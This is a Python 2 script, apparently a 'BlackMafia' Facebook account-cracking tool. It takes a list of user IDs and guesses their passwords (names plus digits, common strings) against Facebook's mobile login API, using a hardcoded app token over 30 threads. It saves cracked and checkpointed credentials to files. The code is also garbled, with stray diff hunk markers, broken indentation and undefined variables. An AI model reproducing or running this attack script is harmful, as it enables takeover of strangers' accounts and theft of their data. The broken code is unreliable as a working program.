#!/usr/bin/python2																	#coding=utf-8																	

#The Credit For This Code Goes To AneesJerry																	

#If You Wanna Take Credits For This Code, Please Look Yourself Again...																	

#Reserved2020																	

																	

																	

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize																	

from multiprocessing.pool import ThreadPool																	

from requests.exceptions import ConnectionError																	

from mechanize import Browser																	

																	

																	

reload(sys)																	

sys.setdefaultencoding('utf8')																	

br = mechanize.Browser()																	

br.set_handle_robots(False)																	

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)																	

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]																	

																	

																	

def keluar():																	

	print "\x1b[1;91mExit"																

	os.sys.exit()																

																	

																	

def acak(b):																	

    w = 'ahtdzjc'																	

    d = ''																	

    for i in x:																	

        d += '!'+w[random.randint(0,len(w)-1)]+i																	

    return cetak(d)																	

																	

																	

def cetak(b):																	

    w = 'ahtdzjc'																	

    for i in w:																	

        j = w.index(i)																	

        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))																	

    x += '\033[0m'																	

    x = x.replace('!0','\033[0m')																	

    sys.stdout.write(x+'\n')																	

																	

																	

def jalan(z):																	

	for e in z + '\n':																

		sys.stdout.write(e)															

		sys.stdout.flush()															

		time.sleep(0.07)															

																	

#Dev:Anees_jerry																	

##### LOGO #####																	

logo = """																	

       \033[1;91m:▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:																	

      \033[1;92m▒▒▒▒▒▒▒▒█▒█▒█▒▒▒█▒█▒█▒▒▒▒▒▒▒▒▒▒::     																	

     \033[1;93m:▒▒▒▒▒▒███▒█▒█▒███▒█▒█▒▒▒▒▒▒▒\033[1;96mLatest.version.1.12    																	

     \033[1;93m:▒▒▒▒▒▒███▒█▒█▒███▒█▒█▒▒▒▒▒▒▒▒▒▒:::      																	

    \033[1;94m::▒▒▒▒▒▒█▒▒▒█▒█▒█▒▒▒█▒█▒▒▒▒▒▒▒▒▒▒::::      																	

   \033[1;95m:::▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:::::         																	

  \033[1;96m::▒▒▒▒▒▒▒▒▒▒\033[1;91mWhatsapp\033[1;96m▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒::::        																	

  \033[1;91m:▒▒▒▒▒▒▒▒▒▒\033[1;93m+923172529124\033[1;91m▒▒▒▒▒▒▒▒▒▒▒▒▒:::::																	

  \033[1;96m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        																	

  \033[1;91m:》》》\033[1;93m+923172529124\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::																	

\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-BlackMafia-\033[1;95m♡╭──────────•◈•──────────╮♡																	

\033[1;92m..........................BlackMafia......................																	

\033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗																	

@@ -104,7 +104,7 @@ jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈

jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")																	

print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin BlackMafia\033[1;95m♡╰──────────•◈•──────────╯♡"																	

CorrectUsername = "BlackMafiaNew"																	

CorrectUsername = "BlackMafia"																	

CorrectPassword = "lovehacker"																	

loop = 'true'																	

@@ -135,6 +135,7 @@ def login():

		jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To Login' )															

		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"															

		print('	   \033[1;94m♡\x1b[1;91m》》》》》》LOGIN WITH FACEBOOK《《《《《《\x1b[1;94m♡' )														

		print('	 )														

		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')															

		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')															

		tik()															

@@ -305,146 +306,117 @@ def pilih_super():

		try:															

			os.mkdir('out')														

		except OSError:															

			#Pass1														

			pass #Dev:love_hacker														

		try:															

			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)														

			b = json.loads(a.text)														

			pass1 = b['first_name']+'123'														

			pass1 = "786786","loveislife","1234567890","000786","456456","Muhammad123","Katrina123","@@@###","Hacker123"														

			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")														

			q = json.load(data)														

			if 'access_token' in q:														

				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])													

				z = json.loads(x.text)													

				print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass1+" =>"+z['name'])													

				print '\x1b[1;91mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1													

				oks.append(user+pass1)													

			else:														

				if 'www.facebook.com' in q["error_msg"]:													

					cek = open("out/super_cp.txt", "a")												

					print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1												

					cek = open("out/checkpoint.txt", "a")												

					cek.write(user+"|"+pass1+"\n")												

					cek.close()												

					cekpoint.append(user+pass1)												

				else:													

					#Pass2												

					pass2 = b['first_name']+'12345'												

					pass2 = 'Pakistan',"786007","123456789","122786","Ali123","Muhammad786","love123","££¥₩786","Pti123"												

					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

					q = json.load(data)												

					if 'access_token' in q:												

						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])											

						z = json.loads(x.text)											

						print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass2+" =>"+z['name'])											

						print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2											

						oks.append(user+pass2)											

					else:												

						if 'www.facebook.com' in q["error_msg"]:											

							cek = open("out/super_cp.txt", "a")										

							print '\x1b[1;92mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2										

							cek = open("out/checkpoint.txt", "a")										

							cek.write(user+"|"+pass2+"\n")										

							cek.close()										

							cekpoint.append(user+pass2)										

						else:											

							#Pass3										

							pass3 = b['last_name'] + '123'										

							pass3 = b['first_name'] + '12345'										

							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										

							q = json.load(data)										

							if 'access_token' in q:										

								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])									

								z = json.loads(x.text)									

								print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass3+" =>"+z['name'])									

								print '\x1b[1;93mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3									

								oks.append(user+pass3)									

							else:										

								if 'www.facebook.com' in q["error_msg"]:									

									cek = open("out/super_cp.txt", "a")								

									print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3								

									cek = open("out/checkpoint.txt", "a")								

									cek.write(user+"|"+pass3+"\n")								

									cek.close()								

									cekpoint.append(user+pass3)								

								else:									

									#Pass4								

									lahir = b['birthday']								

									pass4 = lahir.replace('/', '')								

									pass4 = b['first_name'] + '123'								

									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								

									q = json.load(data)								

									if 'access_token' in q:								

										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])							

										z = json.loads(x.text)							

										print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass4+" =>"+z['name'])							

										print '\x1b[1;94mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4							

										oks.append(user+pass4)							

									else:								

										if 'www.facebook.com' in q["error_msg"]:							

											cek = open("out/super_cp.txt", "a")						

											print '\x1b[1;94mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4						

											cek = open("out/checkpoint.txt", "a")						

											cek.write(user+"|"+pass4+"\n")						

											cek.close()						

											cekpoint.append(user+pass4)						

										else:							

											#Pass5						

											pass5 = "786786","Pakistan"						

											pass5 = b['first_name'] + '786'						

											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						

											q = json.load(data)						

											if 'access_token' in q:						

												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])					

												z = json.loads(x.text)					

												print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass5+" =>"+z['name'])					

												print '\x1b[1;95mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5					

												oks.append(user+pass5)					

											else:						

												if 'www.facebook.com' in q["error_msg"]:					

													cek = open("out/super_cp.txt", "a")				

													print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5				

													cek = open("out/checkpoint.txt", "a")				

													cek.write(user+"|"+pass5+"\n")				

													cek.close()				

													cekpoint.append(user+pass5)				

												else:					

													#Pass6				

													pass6 = "Khan123","Pakistan123"				

													pass6 = 'Pakistan1'				

													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				

													q = json.load(data)				

													if 'access_token' in q:				

														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])			

														z = json.loads(x.text)			

														print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass6+" =>"+z['name'])			

														print '\x1b[1;96mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6			

														oks.append(user+pass6)			

													else:				

														if 'www.facebook.com' in q["error_msg"]:			

															cek = open("out/super_cp.txt", "a")		

															print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6		

															cek = open("out/checkpoint.txt", "a")		

															cek.write(user+"|"+pass6+"\n")		

															cek.close()		

															cekpoint.append(user+pass6)		

														else:			

															#Pass7		

															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)		

															b = json.loads(a.text)		

															pass7 = "loveislife","1234567890","000786","456456","Muhammad123","Katrina123","@@@###","Hacker123"		

															pass7 = b['first_name'] + '1234'		

															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")		

															q = json.load(data)		

															if 'access_token' in q:		

																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])	

																z = json.loads(x.text)	

																print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass7+" =>"+z['name'])	

																print '\x1b[1;97mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7	

																oks.append(user+pass7)	

															else:		

																if 'www.facebook.com' in q["error_msg"]:	

																	cek = open("out/super_cp.txt", "a")

																	print '\x1b[1;97mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7

																	cek = open("out/checkpoint.txt", "a")

																	cek.write(user+"|"+pass7+"\n")

																	cek.close()

																	cekpoint.append(user+pass7)

                                                                                                                                else:																	

                                                                                                                                        #Pass8																	

                                                                                                                                         a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)																	

                                                                                                                                         b = json.loads(a.text)																	

                                                                                                                                         pass8 = "Jan123","PakArmy","Ali123","112233","Pti123","Pti786","Triker123","Reporter123","696969","000786","PakistanZindabad"																	

                                                                                                                                         data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%252525257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")																	

                                                                                                                                         q = json.load(data)																	

                                                                                                                                         if 'access_token' in q:																	

                                                                                                                                                 x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])																	

                                                                                                                                                 z = json.loads(x.text)																	

                                                                                                                                                 print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass8+" =>"+z['name'])																	

                                                                                                                                                 oks.append(user+pass8)																	

                                                                                                                                         else:																	

                                                                                                                                                 if 'www.facebook.com' in q["error_msg"]:																	

                                                                                                                                                         cek = open("out/super_cp.txt", "a")																	

                                                                                                                                                         cek.write(user+"|"+pass8+"\n")																	

                                                                                                                                                         cek.close()																	

                                                                                                                                                         cekpoint.append(user+pass8)																	

         except:																	

		pass														

		except:															

			pass														

	p = ThreadPool(30)																

	p.map(main, id)																

	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡""																

	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"																

	print "  \033[1;93m«---•◈•---Developed By love---•◈•---»" #Dev:love_hacker																

	print '\033[1;91mProcess Has Been Completed\033[1;92m....'																

	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))																

	print """																

             																	

             ...........███ ]▄▄▄▄▄▃																	

             ..▂▄▅█████▅▄▃▂																	

             [███████████████]																	

             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤																	

♡──────────────•◈•──────────────♡.																	

: \033[1;96m .....Aneesjerry  BlackMafia........... \033[1;93m :																	

♡──────────────•◈•──────────────♡.' 																	

                whatsapp Num																	

               +923172529124"""																	

																	

	raw_input("\n\033[1;92m[\033[1;94mBack\033[1;96m]")																

	menu()																

																	

if __name__ == '__main__':																	

	login()	
